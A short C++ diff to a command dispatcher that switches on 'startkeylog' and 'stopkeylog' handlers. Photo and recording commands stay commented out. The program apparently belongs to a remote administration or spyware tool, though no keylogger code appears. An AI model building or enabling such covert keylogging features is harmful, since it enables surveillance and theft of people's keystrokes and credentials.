@@ -20,8 +20,8 @@ ProcessCommand::ProcessCommand() : message(), response() {
                      //{"takephoto", new TakePhotoCommand},
                      //{"startrecord", new StartRecordCommand},
                      //{"stoprecord", new StopRecordCommand},
-                     //{"startkeylog", new StartKeylogCommand},
-                     //{"stopkeylog", new StopKeylogCommand},
+                     {"startkeylog", new StartKeylogCommand},
+                     {"stopkeylog", new StopKeylogCommand},
                      {"help", new HelpCommand}
                      });
 }
